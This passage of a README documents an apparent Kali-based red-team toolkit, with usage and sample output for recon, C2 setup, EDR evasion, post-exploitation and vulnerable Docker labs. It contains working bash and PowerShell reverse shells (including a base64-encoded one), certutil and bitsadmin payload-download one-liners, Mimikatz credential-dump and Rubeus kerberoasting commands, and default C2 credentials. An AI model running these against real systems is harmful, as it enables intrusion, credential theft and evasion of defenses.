  [*] Target:  10.0.0.1
  [*] Profile: full
  [*] Output:  /root/scans/10.0.0.1_20260604_190831

  [1/3] Full port scan (all 65535)...
  [2/3] Service detection on open ports...
  [3/3] Generating report...

  [✔] Scan complete
  [✔] Results: /root/scans/10.0.0.1_20260604_190831/
```

---

### 6. dir-fuzz — Directory Fuzzer

Professional directory fuzzer using ffuf and gobuster.

```bash
dir-fuzz <url> [wordlist]

# Example
dir-fuzz https://example.com
dir-fuzz https://example.com /opt/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

#### Output Example

```
  [*] URL:      https://example.com
  [*] Wordlist: /opt/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
  [*] Output:   /root/dir-fuzz/https_example_com_20260604_190831

  [1/2] Running ffuf...
  [2/2] Running gobuster...

  [✔] Fuzzing complete
  [✔] Results: /root/dir-fuzz/https_example_com_20260604_190831/
```

---

### 7. vuln-scan — Vulnerability Scanner

Professional vulnerability scanner using Nuclei.

```bash
vuln-scan <target|file> [severity]

# Severity: low, medium, high, critical (comma-separated)

# Examples
vuln-scan https://example.com
vuln-scan urls.txt high,critical
```

#### Output Example

```
  [*] Target:   https://example.com
  [*] Severity: low,medium,high,critical
  [*] Output:   /root/vuln-scans/20260604_190831

  [1/3] Scanning single target...
  [2/3] Running Nuclei...
  [✔] Nuclei: 23 findings
  [3/3] Generating report...

═══════════════════════════════════════════════════════
  SCAN COMPLETE
═══════════════════════════════════════════════════════
  Findings: 23
  Report:   /root/vuln-scans/20260604_190831/report.md
  JSON:     /root/vuln-scans/20260604_190831/nuclei.json
```

---

### 8. newbb — Bug Bounty Workspace

Creates a structured Bug Bounty workspace for a target domain.

```bash
newbb <domain> [program_name]

# Example
newbb example.com
newbb example.com hackerone-program
```

#### Output Example

```
  [*] Creating Bug Bounty workspace for: example.com
  [*] Program: example.com

    [+] recon — Subdomain enumeration, port scanning, service detection
    [+] recon/subdomains — Subdomain lists from various tools
    [+] recon/ports — Port scan results
    [+] exploitation — Exploit development and testing
    [+] exploitation/poc — Proof of Concept files
    [+] vulnerabilities — Discovered vulnerabilities
    [+] reports — Final reports and submissions
    [+] notes — Working notes and observations
    [+] loot — Credentials, sensitive data (ENCRYPTED)

═══════════════════════════════════════════════════════
  WORKSPACE CREATED SUCCESSFULLY
═══════════════════════════════════════════════════════

  Location: /root/bugbounty/example.com

  Next steps:
    cd /root/bugbounty/example.com
    bb-recon example.com --deep
    vim notes/initial-notes.md
```

---

### 9. newctf — CTF Workspace

Creates a structured CTF workspace for a challenge or machine.

```bash
newctf <name> [htb|thm|ctfd|pico|other]

# Examples
newctf keeper htb
newctf corridor thm
newctf web-challenge ctfd
```

#### Output Example

```
  [*] Creating CTF workspace: keeper
  [*] Platform: htb

    [+] web — Web exploitation, XSS, SQLi, SSRF, etc.
    [+] pwn — Binary exploitation, buffer overflow, ROP
    [+] crypto — Cryptography, encoding, hashing
    [+] forensics — Memory, disk, network forensics
    [+] reverse — Reverse engineering, malware analysis
    [+] stego — Steganography, hidden data
    [+] misc — Miscellaneous challenges
    [+] osint — Open Source Intelligence
    [+] notes — General notes and writeups
    [+] tools — Custom tools and scripts
    [+] flags — Captured flags

═══════════════════════════════════════════════════════
  CTF WORKSPACE CREATED
═══════════════════════════════════════════════════════

  Location: /root/ctf/htb/keeper
  Next:    cd /root/ctf/htb/keeper
```

---

### 10. newad — AD Workspace

Creates a structured Active Directory engagement workspace.

```bash
newad <domain> [dc-ip]

# Example
newad corp.local 10.0.0.1
```

#### Output Example

```
  [*] Creating AD workspace: corp.local

    [+] recon — Domain reconnaissance
    [+] recon/users — User enumeration results
    [+] recon/groups — Group enumeration
    [+] bloodhound — BloodHound data
    [+] kerberos — Kerberos tickets and attacks
    [+] ntlm — NTLM relay and attacks
    [+] loot — Credentials and sensitive data
    [+] exploits — Exploitation attempts
    [+] reports — Reports and documentation

═══════════════════════════════════════════════════════
  AD WORKSPACE CREATED
═══════════════════════════════════════════════════════

  Location: /root/redteam/ad/corp.local
  Next:    cd /root/redteam/ad/corp.local && ./commands.sh
```

---

### 11. newpayload — Payload Workspace

Creates a structured payload development workspace.

```bash
newpayload <name> [windows|linux|web|macro|shellcode]

# Example
newpayload beacon-v2 windows
```

#### Output Example

```
  [*] Creating payload workspace: beacon-v2
  [*] Type: windows

    [+] src — Source code
    [+] src/c — C/C++ source
    [+] src/csharp — C# source
    [+] src/nim — Nim source
    [+] output — Compiled payloads
    [+] shellcode — Shellcode (raw, hex, base64)
    [+] obfuscated — Obfuscated versions
    [+] loaders — Custom loaders
    [+] encryptors — Encryption tools
    [+] test — Testing environment

═══════════════════════════════════════════════════════
  PAYLOAD WORKSPACE CREATED
═══════════════════════════════════════════════════════

  Location: /root/payloads/beacon-v2
  Next:    cd /root/payloads/beacon-v2/src/c
```

---

### 12. newredteam — Red Team Operation

Creates a structured Red Team operation workspace based on PTES methodology.

```bash
newredteam <operation_name>

# Example
newredteam operation_phoenix
```

#### Output Example

```
  [*] Creating Red Team operation: operation_phoenix

    [+] 01-pre-engagement — Rules of engagement, scope, ROE
    [+] 02-intelligence-gathering — OSINT, passive recon
    [+] 03-threat-modeling — Threat analysis, attack vectors
    [+] 04-vulnerability-analysis — Vuln analysis, PoC development
    [+] 05-exploitation — Exploitation attempts, C2 setup
    [+] 06-post-exploitation — Lateral movement, persistence
    [+] 07-reporting — Final reports, executive summary
    [+] c2 — C2 infrastructure and configs
    [+] tools — Custom tools and scripts
    [+] loot — Collected data (ENCRYPTED)
    [+] notes — Daily operation notes

═══════════════════════════════════════════════════════
  RED TEAM OPERATION WORKSPACE CREATED
═══════════════════════════════════════════════════════

  Location: /root/redteam/operations/operation_phoenix
  Next:    vim /root/redteam/operations/operation_phoenix/01-pre-engagement/operation-plan.md
```

---

### 13. setup-redirector — C2 Redirector

Interactive wizard to configure an Nginx C2 redirector with automatic Let's Encrypt SSL.

```bash
setup-redirector
```

#### Output Example

```
═══════════════════════════════════════════════════════
       C2 REDIRECTOR SETUP — OPSEC Automation
═══════════════════════════════════════════════════════

[1/5] Domain (e.g., cdn.example.com): cdn.example.com
[2/5] Backend protocol [https]: https
[3/5] Backend host (teamserver IP) [127.0.0.1]: 10.0.0.100
[4/5] Backend port [443]: 443
[5/5] C2 URI patterns (regex, comma-separated, e.g. ^/api,^/beacon): ^/api,^/beacon

[*] Testing nginx config...
nginx: the configuration file /etc/nginx/nginx.conf syntax is ok
nginx: configuration file /etc/nginx/nginx.conf test is successful

[*] Requesting Let's Encrypt SSL for cdn.example.com...
[!] Ensure DNS A record for cdn.example.com points to this server
Continue with certbot? [y/N]: y

[✔] Redirector ready!
  Domain:   https://cdn.example.com
  Backend:  https://10.0.0.100:443
  C2 URIs:  ^/api|^/beacon
  Config:   /etc/nginx/sites-available/cdn.example.com.conf
```

**List active redirectors:**
```bash
list-redirectors
```

```
=== Active C2 Redirectors ===
  [✔] cdn.example.com -> https://10.0.0.100:443
  [✔] api.example.com -> https://10.0.0.101:443
```

---

### 14. evasion-menu — EDR Evasion

Displays the EDR/AV evasion toolkit and available commands.

```bash
evasion-menu
```

#### Output Example

```
═══════════════════════════════════════════════════════
       EDR/AV EVASION TOOLKIT
═══════════════════════════════════════════════════════

[SHELLCODE GENERATORS]
  1) donut          — .NET/PE/VBS → PIC shellcode
  2) sgn             — Shikata Ga Nai encoder

[EDR BYPASS]
  3) scarecrow       — EDR bypass (DLL side-load)
  4) freeze          — Payload obfuscation
  5) inceptor        — AV/EDR bypass

[PE PACKERS & CRYPTERS]
  6) pezor           — PE packer
  7) nimcrypt2       — Nim-based PE crypter

[DETECTION TOOLS]
  8) pe-sieve        — detect in-memory hooks
  9) hollows-hunter  — find hollowed processes

[STATUS]
  10) Check installed tools

  0) Exit

Select [0-10]:
```

**Installed tools and usage:**

```bash
# Donut — convert .NET/PE/VBS to PIC shellcode
donut -f <input.exe> -o <output.bin>

# ScareCrow — EDR bypass via DLL side-loading
scarecrow -I <shellcode.bin> -Loader dll -domain <domain>

# SGN — Shikata Ga Nai shellcode encoder
sgn -i <shellcode.bin> -o <encoded.bin> -a 64 -c 2

# Freeze — payload obfuscation
freeze -payload <shellcode.bin> -loader dll -domain <domain>

# Inceptor — AV/EDR bypass template engine
inceptor <template.hb> -o <output.exe>

# Pezor — PE packer with shellcode injection
pezor <payload.exe> -o <packed.exe>

# PE-Sieve — detect in-memory hooks/patches
pe-sieve --pid <target_pid>

# Hollows Hunter — scan for hollowed/hooked processes
hollows-hunter

# Nimcrypt2 — Nim-based PE crypter
nimcrypt2 -f <payload.exe> -o <crypted.exe>
```

---

### 15. postexploit-menu — Post-Exploitation

Displays the post-exploitation kit and all available binaries.

```bash
postexploit-menu
```

#### Output Example

```
╔═══════════════════════════════════════════════════════╗
║   POST-EXPLOITATION TOOLKIT v2.0                      ║
║   Professional Post-Exploitation Menu                 ║
╚═══════════════════════════════════════════════════════╝

[1] HTTP SERVER & TRANSFER
  pe-server              — Start HTTP server (auto port)
  pe-server 9000         — Start on specific port
  pe-transfer <file>     — Quick file transfer

[2] LINUX PRIVILEGE ESCALATION
  linpeas                — Linux privilege escalation auditor
  pspy64                 — Unprivileged process monitor
  linux-exploit-suggester — Kernel exploit suggester
  suid3num               — SUID binary analyzer
  linenum                — Linux enumeration
  linuxprivchecker       — Privilege checker
  gtfobins-search        — GTFOBins search
  beroot                 — Linux privesc checker
  laZagne-linux          — Credential dump (Linux)

[3] WINDOWS PRIVILEGE ESCALATION
  /opt/postexploit/windows/winPEASx64.exe
  /opt/postexploit/windows/winPEASx86.exe
  /opt/postexploit/windows/PowerUp.ps1
  /opt/postexploit/windows/SharpUp.exe
  /opt/postexploit/windows/Seatbelt.exe

[4] CREDENTIAL DUMPING
  /opt/postexploit/windows/mimikatz.exe       — Windows credentials
  /opt/postexploit/windows/Rubeus.exe         — Kerberos attacks
  /opt/postexploit/windows/SafetyKatz.exe     — Safe Mimikatz

[5] COMMUNICATION TOOLS
  nc                     — Netcat (OpenBSD)
  ncat                   — Nmap's netcat
  socat                  — Multipurpose relay
  telnet                 — Telnet client
  cryptcat               — Encrypted netcat
  tsh                    — Tiny SHell

[6] TUNNELING & PIVOTING
  chisel                 — Fast TCP tunnel over HTTP
  ligolo-proxy           — Ligolo-ng server
  ligolo-agent           — Ligolo-ng agent
  /opt/postexploit/tunneling/rpivot/  — Reverse pivot
  /opt/postexploit/tunneling/ssf/     — Secure Socket Funneling

[7] REVERSE SHELL & UPGRADE
  revshell IP PORT [type] — Generate reverse shell
  Types: bash, python, nc, powershell, php, perl, ruby

  Listener:
    nc -lvnp 4444
    rlwrap nc -lvnp 4444  (with line editing)

  Shell Upgrade:
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    Ctrl+Z → stty raw -echo → fg → export TERM=xterm

  0) Exit
```

**Installed tools and usage:**

```bash
# LinPEAS — Linux privilege escalation auditor
linpeas
linpeas -a                        # all checks
linpeas | tee linpeas_output.txt  # save output

# pspy — unprivileged process monitor (no root needed)
pspy64
pspy64 -pf -i 1000               # watch processes and file events

# Chisel — TCP/UDP tunneling over HTTP
# On attacker:
chisel server -p 8080 --reverse
# On target:
chisel client <attacker_ip>:8080 R:1080:socks

# ligolo-ng — advanced tunneling
# On attacker:
ligolo-proxy -selfcert -laddr 0.0.0.0:11601
# On target (upload ligolo-agent):
ligolo-agent -connect <attacker_ip>:11601 -ignore-cert

# Mimikatz — Windows credentials extraction
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords

# Rubeus — Kerberos attacks
Rubeus.exe kerberoast /format:hashcat
```

---

### 16. lab-manager — Docker Labs

Interactive Docker-based vulnerable lab manager with 30 labs across 8 categories.

```bash
# Interactive menu
lab-manager

# Direct commands
lab-manager start dvwa
lab-manager start webgoat
lab-manager stop all
lab-manager status
lab-manager logs dvwa
lab-manager shell dvwa

# Quick commands
start-lab dvwa
stop-lab dvwa
lab-status
```

#### Output Example (Interactive Menu)

```
╔═══════════════════════════════════════════════════════╗
║   OFFENSIVE DOCKER LAB MANAGER v2.0                   ║
║   30+ Vulnerable Labs • Port Management • Dashboard   ║
╚═══════════════════════════════════════════════════════╝

  Status: 5 running | 30 total

[LABS]
    1) Web Vulnerabilities      (DVWA, WebGoat, Juice Shop...)
    2) API Security             (vAPI, DVWS, REST Goat...)
    3) Active Directory         (Metasploit, VulnAD...)
    4) Network Security         (Nagios, ELK...)
    5) Mobile Security          (InsecureBank, DIVA...)
    6) Cloud Security           (LocalStack, CloudGoat...)
    7) CTF / Wargames           (HTB-style, Pwnable...)
    8) Reverse Engineering      (Malware Traffic, flAWS...)

[MANAGEMENT]
    9) Status Dashboard
    10) List All Labs
    11) Start Specific Lab
    12) Stop Specific Lab
    13) View Lab Logs
    14) Shell Access
    15) Stop ALL Labs

  0) Exit

  Select [0-15]:
```

#### Output Example (Start Lab)

```
═══════════════════════════════════════════════════════
  LAB STARTED SUCCESSFULLY
═══════════════════════════════════════════════════════

  Name:        dvwa
  Description: Damn Vulnerable Web Application
  Category:    web
  Image:       vulnerables/web-dvwa
  Port:        8080 → 80
  URL:         http://localhost:8080
  Username:    admin
  Password:    password

  Useful Commands:
    lab-manager logs dvwa
    lab-manager shell dvwa
    lab-manager stop dvwa

  [✔] dvwa is running
```

#### Available Labs (30 Labs)

| Category | Lab | URL | Credentials |
|----------|-----|-----|-------------|
| **Web** | DVWA | http://localhost:8080 | admin:password |
| **Web** | WebGoat | http://localhost:8081/WebGoat | guest:guest |
| **Web** | Juice Shop | http://localhost:3000 | admin@juice-sh.op:admin123 |
| **Web** | bWAPP | http://localhost:8082 | bee:bug |
| **Web** | Mutillidae | http://localhost:8083 | admin:admin |
| **Web** | NodeGoat | http://localhost:4000 | admin:admin |
| **Web** | RailsGoat | http://localhost:3001 | ken@owasp.org:ken123 |
| **Web** | crAPI | http://localhost:8888 | user@example.com:Admin123# |
| **Web** | DVGraphQL | http://localhost:5013 | admin:password |
| **Web** | WAVSEP | http://localhost:8084 | admin:password |
| **API** | vAPI | http://localhost:8085 | admin:password |
| **API** | DVWS | http://localhost:8086 | admin:password |
| **API** | REST Goat | http://localhost:8087 | admin:password |
| **AD** | Metasploit | host networking | msf:msf |
| **AD** | VulnAD | host networking | admin:Password1 |
| **AD** | Samba-vuln | smb://localhost:445 | admin:password |
| **Network** | Nagios | http://localhost:8088 | nagiosadmin:nagios |
| **Network** | ELK | http://localhost:5601 | elastic:changeme |
| **Network** | Security Ninja | http://localhost:8089 | admin:admin |
| **Mobile** | InsecureBank | http://localhost:9999 | dinesh:Welcome@123 |
| **Mobile** | DIVA | http://localhost:8090 | admin:admin |
| **Mobile** | UnCrackable | http://localhost:8091 | admin:admin |
| **Cloud** | LocalStack | http://localhost:4566 | aws:aws |
| **Cloud** | CloudGoat | http://localhost:5000 | admin:admin |
| **Cloud** | Kube-vuln | http://localhost:8092 | admin:admin |
| **CTF** | HTB Skeleton | http://localhost:8093 | admin:admin |
| **CTF** | Pwnable | http://localhost:8094 | admin:admin |
| **CTF** | CryptoHack | http://localhost:8095 | admin:admin |
| **RE** | Malware Traffic | http://localhost:8096 | admin:admin |
| **RE** | flAWS | http://localhost:8097 | admin:admin |

---

### 17. c2-menu — C2 Launcher

Interactive launcher for all installed C2 frameworks with status dashboard.

```bash
c2-menu

# Direct commands
c2-menu status
c2-menu start sliver
c2-menu details havoc
```

#### Output Example (Interactive Menu)

```
╔═══════════════════════════════════════════════════════╗
║   RED TEAM C2 FRAMEWORK LAUNCHER v2.0                 ║
║   8 C2 Frameworks • Status Dashboard • Connection Info║
╚═══════════════════════════════════════════════════════╝

[C2 FRAMEWORKS]
  ────────────────────────────────────────────────────────
  1) Sliver        — Modern multi-protocol C2
  2) Havoc         — Modern C2 with great UI
  3) Mythic        — Cross-platform C2 (Docker)
  4) Covenant      — .NET-based C2
  5) Empire        — Post-exploitation framework
  6) Starkiller    — Empire GUI
  7) Merlin        — HTTP/2 C2
  8) NimPlant      — Nim-based beacon

[MANAGEMENT]
  ────────────────────────────────────────────────────────
  9) Status Dashboard
  10) Show C2 Details

  0) Exit

Select [0-10]:
```

#### Output Example (Status Dashboard)

```
═══════════════════════════════════════════════════════
       C2 FRAMEWORK STATUS DASHBOARD
═══════════════════════════════════════════════════════

[COMMANDS]
  ────────────────────────────────────────────────────────
  [✔] sliver-server → /usr/local/bin/sliver-server
  [✔] havoc → /usr/local/bin/havoc
  [✔] mythic-cli → /usr/local/bin/mythic-cli
  [✔] covenant → /usr/local/bin/covenant
  [✔] empire → /usr/local/bin/empire
  [✔] starkiller → /usr/local/bin/starkiller
  [✔] merlin → /usr/local/bin/merlin
  [✔] nimplant → /usr/local/bin/nimplant

[PORTS]
  ────────────────────────────────────────────────────────
  [●] Port 31337 [LISTENING]
  [●] Port 40056 [LISTENING]
  [●] Port 7443 [LISTENING]
  [○] Port 1337 [NOT LISTENING]
  [○] Port 4173 [NOT LISTENING]
  [○] Port 50051 [NOT LISTENING]

[DIRECTORIES]
  ────────────────────────────────────────────────────────
  [✔] Havoc → /opt/Havoc
  [✔] Mythic → /opt/Mythic
  [✔] Covenant → /opt/Covenant
  [✔] Empire → /opt/Empire
  [✔] Starkiller → /opt/Starkiller
  [✔] merlin → /opt/merlin
  [✔] NimPlant → /opt/NimPlant

═══════════════════════════════════════════════════════
  Summary: 8 commands | 3 listening | 7 directories
═══════════════════════════════════════════════════════
```

#### Available C2 Frameworks

| Option | Framework | Protocol | Port | Default Credentials |
|--------|-----------|----------|------|---------------------|
| 1 | **Sliver** | mTLS / WireGuard / HTTP(S) | 31337 | — |
| 2 | **Havoc** | HTTPS / SMB | 40056 | 5pider / password1234 |
| 3 | **Mythic** | HTTPS (Docker) | 7443 | mythic_admin / Admin123! |
| 4 | **Covenant** | HTTPS (.NET) | 7443 | Create on first login |
| 5 | **Empire** | HTTPS / SMB | 1337 | empireadmin / password123 |
| 6 | **Starkiller** | Web UI | 4173 | — |
| 7 | **Merlin** | HTTP/2 / QUIC | 50051 | merlin |
| 8 | **NimPlant** | HTTPS | 31337 | — |

**Individual start commands:**
```bash
sliver-server                           # Sliver
havoc server                            # Havoc teamserver
mythic-cli start                        # Mythic
covenant                                # Covenant
empire server                           # Empire
starkiller                              # Starkiller GUI
merlin server                           # Merlin server
merlin client                           # Merlin client
nimplant server                         # NimPlant
```

---

### 18. pe-server — HTTP Server

Professional dynamic HTTP server for post-exploitation file serving with auto port selection.

```bash
pe-server [port]

# Examples
pe-server              # Use default port 8888
pe-server 9000         # Use port 9000
pe-server 0            # Auto-select free port
```

#### Output Example

```
═══════════════════════════════════════════════════════
  POST-EXPLOITATION HTTP SERVER
═══════════════════════════════════════════════════════

  Port:    8888
  Serving: /opt/postexploit

  Connection URLs:
  ────────────────────────────────────────────────────────
  → http://192.168.1.100:8888/  (local)
  → http://203.0.113.50:8888/   (public)

  Quick Download Commands:
  ────────────────────────────────────────────────────────
  Linux:
    wget http://192.168.1.100:8888/linux/linpeas.sh
    curl http://192.168.1.100:8888/linux/linpeas.sh -o linpeas.sh
    python3 -c 'import urllib.request; urllib.request.urlretrieve("http://192.168.1.100:8888/linux/linpeas.sh", "linpeas.sh")'

  Windows (PowerShell):
    IWR -Uri http://192.168.1.100:8888/windows/winPEASx64.exe -OutFile winPEAS.exe
    Invoke-WebRequest -Uri http://192.168.1.100:8888/windows/winPEASx64.exe -OutFile winPEAS.exe
    (New-Object Net.WebClient).DownloadFile("http://192.168.1.100:8888/windows/winPEASx64.exe", "winPEAS.exe")

  Windows (CMD):
    certutil -urlcache -split -f http://192.168.1.100:8888/windows/winPEASx64.exe winPEAS.exe
    bitsadmin /transfer download /priority high http://192.168.1.100:8888/windows/winPEASx64.exe winPEAS.exe

  Available Files:
  ────────────────────────────────────────────────────────
  Linux:
    • http://192.168.1.100:8888/linux/linpeas.sh
    • http://192.168.1.100:8888/linux/pspy64
    • http://192.168.1.100:8888/linux/pspy32
    • http://192.168.1.100:8888/linux/linux-exploit-suggester.sh

  Windows:
    • http://192.168.1.100:8888/windows/winPEASx64.exe
    • http://192.168.1.100:8888/windows/winPEASx86.exe
    • http://192.168.1.100:8888/windows/mimikatz.exe
    • http://192.168.1.100:8888/windows/Rubeus.exe

  Press Ctrl+C to stop the server
═══════════════════════════════════════════════════════
```

---

### 19. pe-transfer — File Transfer

Quick file transfer helper with automatic port selection.

```bash
pe-transfer <file> [target_ip]

# Examples
pe-transfer /path/to/file.exe
pe-transfer /path/to/file.exe 10.0.0.1
```

#### Output Example

```
  [*] File: payload.exe (2.3M)
  [*] From: 192.168.1.100

  [!] Starting temporary server on port 8889...

═══════════════════════════════════════════════════════
  TRANSFER COMMANDS
═══════════════════════════════════════════════════════

  Linux:
    wget http://192.168.1.100:8889/payload.exe
    curl http://192.168.1.100:8889/payload.exe -o payload.exe

  Windows (PowerShell):
    IWR -Uri http://192.168.1.100:8889/payload.exe -OutFile payload.exe

  Windows (CMD):
    certutil -urlcache -split -f http://192.168.1.100:8889/payload.exe payload.exe

  Netcat Alternative:
    # On attacker: nc -lvp 4444 < payload.exe
    # On target:   nc 192.168.1.100 4444 > payload.exe

  [!] Press Ctrl+C to stop server
```

---

### 20. revshell — Reverse Shell Generator

Professional reverse shell generator with 9 shell types.

```bash
revshell <ip> <port> [type]

# Types: bash, python, nc, powershell, php, perl, ruby, java, telnet

# Examples
revshell 10.0.0.1 4444 bash
revshell 10.0.0.1 4444 python
revshell 10.0.0.1 4444 powershell
```

#### Output Example (Bash)

```
═══════════════════════════════════════════════════════
  REVERSE SHELL — BASH
═══════════════════════════════════════════════════════

  Target: 10.0.0.1:4444

  Listener:
    nc -lvnp 4444

  Payload:
    bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

  Base64 Encoded:
    echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash

═══════════════════════════════════════════════════════
```

#### Output Example (PowerShell)

```
═══════════════════════════════════════════════════════
  REVERSE SHELL — POWERSHELL
═══════════════════════════════════════════════════════

  Target: 10.0.0.1:4444

  Listener:
    nc -lvnp 4444

  Payload:
    powershell -NoP -NonI -W Hidden -Exec Bypass "$sm=New-Object Net.Sockets.TCPClient('10.0.0.1',4444);$s=$sm.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb + 'PS ' + (pwd).Path + '> ';$sb=([Text.Encoding]::ASCII).GetBytes($sb2);$s.Write($sb,0,$sb.Length);$s.Flush()};$sm.Close()"

═══════════════════════════════════════════════════════
```

---

### 21. secrets-manager — API Keys

Professional secrets manager for API keys and credentials.

```bash
secrets-manager [command]

# Commands: list, set, get, delete, test, backup, restore, encrypt, audit, profile
```

#### Output Example

```bash
# List all secrets
secrets-manager list

═══════════════════════════════════════════════════════
  SECRETS STATUS
═══════════════════════════════════════════════════════
  [✔] Permissions OK: 600

  INSTALLED TOOLS (42)
  ────────────────────────────────────────────────────────
    ✔ GITHUB_TOKEN = ghp_****xxxx
    ✔ SHODAN_API_KEY = ****xxxx
    ✔ AWS_ACCESS_KEY_ID = AKIA****xxxx
    ✗ AWS_SECRET_ACCESS_KEY [NOT SET]
    ✗ VIRUSTOTAL_API_KEY [NOT SET]
    ...

═══════════════════════════════════════════════════════
  Summary:
  Total:       42
  Configured:  15
  Empty:       27
═══════════════════════════════════════════════════════

# Set a secret
secrets-manager set GITHUB_TOKEN ghp_xxxxxxxxxxxx

# Test API keys
secrets-manager test

  Testing GitHub Token...
  [✔] GitHub Token: VALID (remaining: 4999 requests)
  Testing Shodan API...
  [✔] Shodan API: VALID
  Testing VirusTotal API...
  [✗] VirusTotal API: INVALID

# Security audit
secrets-manager audit

═══════════════════════════════════════════════════════
  SECURITY AUDIT
═══════════════════════════════════════════════════════
  Checking secrets.env permissions...
  [✔] Permissions: 600 (secure)
  Scanning for insecure files...
  [✔] No world-readable files
  Checking for empty secrets...
  [!] Found 27 empty secrets
  Checking for weak patterns...
  [✔] No weak patterns detected
  Checking backup encryption...
  [!] No encrypted backup (run: secrets-manager encrypt)

═══════════════════════════════════════════════════════
  ✔ Security audit passed
═══════════════════════════════════════════════════════
```

---

### 22. update-tools — Update Manager

Comprehensive 18-step update system with selective modes.

```bash
update-tools [OPTIONS] [COMPONENT]

# Options:
#   --dry-run        Simulate update without making changes
#   --skip-backup    Skip pre-update backup

# Components:
#   system, go, python, rust, c2, docker, nuclei, wordlists, shell, all

# Examples
update-tools                   # Full update
update-tools --dry-run         # Simulate update
update-tools system            # Update APT only
update-tools go python         # Update Go & Python
update-tools c2 docker         # Update C2 & Docker
```

#### Output Example

```
╔═══════════════════════════════════════════════════════╗
║   KALI MASTER — UPDATE MANAGER v6.7.1                 ║
║   18-Step Comprehensive Update System (FIXED)         ║
╚═══════════════════════════════════════════════════════╝

  Log: /var/log/kali_update_20260604_190831.log
  Started: 2026-06-04 19:08:31

═══════════════════════════════════════════════════════
  ▶ STEP 1/18 — PRE-UPDATE BACKUP
═══════════════════════════════════════════════════════
  [*] Creating system state backup...
  [✔] Backup created: /root/.kali-master/backups/system_state_20260604_190831.tar.gz (28K)

═══════════════════════════════════════════════════════
  ▶ STEP 4/18 — UPGRADE PACKAGES
═══════════════════════════════════════════════════════
  [*] Packages to upgrade: 11
  [✔] apt upgrade completed (11 packages)

═══════════════════════════════════════════════════════
  ▶ STEP 9/18 — UPDATE GO TOOLS
═══════════════════════════════════════════════════════
  [*] Updating subfinder...
  [✔]   subfinder updated
  [*] Updating httpx...
  [✔]   httpx updated
  ... (27 more)
  [✔] Go tools: 29 updated, 0 up-to-date

═══════════════════════════════════════════════════════
  ▶ STEP 12/18 — UPDATE C2 FRAMEWORKS
═══════════════════════════════════════════════════════
  [*] Updating Havoc...
  [✔]   Havoc updated
  [*] Updating Mythic...
  [✔]   Mythic updated
  [*] Updating Covenant...
  [✔]   Covenant updated
  ... (4 more)
  [✔] C2 frameworks: 7 updated

═══════════════════════════════════════════════════════
  UPDATE COMPLETE
═══════════════════════════════════════════════════════

  Duration:      14m 55s
  Log:           /var/log/kali_update_20260604_190831.log

  ✔ Success:     47
  ✗ Failed:      0
  ~ Skipped:    2
  ↑ Updated:     4 components

  🎉 All updates completed successfully!
```

---

### 23. kali-master — Dashboard

Central dashboard for managing all installed tools and checking system status.

```bash
kali-master [command]

# Commands:
#   status     — Show full dashboard (default)
#   fix        — Check missing tools
#   tools      — List all installed tools
#   venvs      — Python environments info
#   labs       — Docker labs status
#   c2         — C2 frameworks info
#   opsec      — OPSEC status
#   cloud      — Cloud tools info
#   certipy    — Certipy AD CS commands
#   evasion    — Evasion tools
#   postex     — Post-exploitation toolkit
```

#### Output Example (Status Dashboard)

```
╔═══════════════════════════════════════════════════════╗
║   KALI MASTER FRAMEWORK — PROFESSIONAL DASHBOARD      ║
║   v6.7.0 • Bug Bounty • Red Team • C2 • Labs          ║
╚═══════════════════════════════════════════════════════╝

[SYSTEM INFORMATION]
  ────────────────────────────────────────────────────────
  OS:       Kali GNU/Linux Rolling
  Kernel:   6.19.14+kali-amd64
  Hostname: kali
  CPU:      Intel Core i7-9750H (12 cores)
  RAM:      2.7Gi / 16Gi
  Disk:     50G / 100G (50% used)
  IP:       192.168.1.100
  Uptime:   2 hours, 15 minutes

[BUG BOUNTY TOOLS]
  ────────────────────────────────────────────────────────
  [✔] subfinder → /usr/local/bin/subfinder
       Version: 2.6.3
  [✔] httpx → /usr/local/bin/httpx
       Version: 1.5.0
  [✔] nuclei → /usr/local/bin/nuclei
       Version: 3.3.7
  ... (29 more)

[RED TEAM C2 FRAMEWORKS]
  ────────────────────────────────────────────────────────
  [✔] sliver-server → /usr/local/bin/sliver-server
  [✔] havoc → /usr/local/bin/havoc
  [✔] mythic-cli → /usr/local/bin/mythic-cli
  ... (5 more)

  C2 Directories:
    [✔] Havoc → /opt/Havoc
    [✔] Mythic → /opt/Mythic
    [✔] Covenant → /opt/Covenant
    ... (4 more)

═══════════════════════════════════════════════════════
  STATISTICS
═══════════════════════════════════════════════════════

  Total Tools:     106
  Installed:       106
  Missing:         0

  Completion:      100%
  [████████████████████████████████████████████████████]

  🎉 All tools are installed!

[QUICK COMMANDS]
  ────────────────────────────────────────────────────────
  kali-master status      → Show this dashboard
  kali-master fix         → Install missing tools
  kali-master tools       → List all installed tools
  kali-master venvs       → Python environments info
  kali-master labs        → Docker labs status
  kali-master c2          → C2 frameworks info
  kali-master opsec       → OPSEC tools status
  kali-master cloud       → Cloud tools info
  c2-menu                 → Interactive C2 launcher
  lab-manager             → Interactive lab manager
  postexploit-menu        → Post-exploitation toolkit
  update-tools            → Update all tools
  bb-recon <domain>       → Bug bounty recon
```

---

### 24. check_tools_status — Tool Status

Quick tool status checker with category breakdown.

```bash
check_tools_status [mode]

# Modes:
#   all        — Check all tools (default)
#   critical   — Check critical tools only
#   missing    — Show missing tools only
#   bugbounty  — Check Bug Bounty tools
#   network    — Check Network tools
#   cloud      — Check Cloud tools
#   c2         — Check C2 frameworks
#   postex     — Check Post-Exploitation tools
```

#### Output Example

```
═══════════════════════════════════════════════════════
  TOOL STATUS CHECK
═══════════════════════════════════════════════════════

[PHASE 1/4] INITIALIZING HEALTH CHECK
  ✔ Health check initialized
    • 9 categories
    • Smart auto-fix enabled

[PHASE 2/4] SCANNING TOOLS BY CATEGORY

  [Bug Bounty Tools] (28 tools)
  ────────────────────────────────────────────────────────
    [✔] nuclei → /usr/local/bin/nuclei
    [✔] subfinder → /usr/local/bin/subfinder
    ... (26 more)

    Category Status: 28/28 (100%)

  [C2 Frameworks] (8 tools)
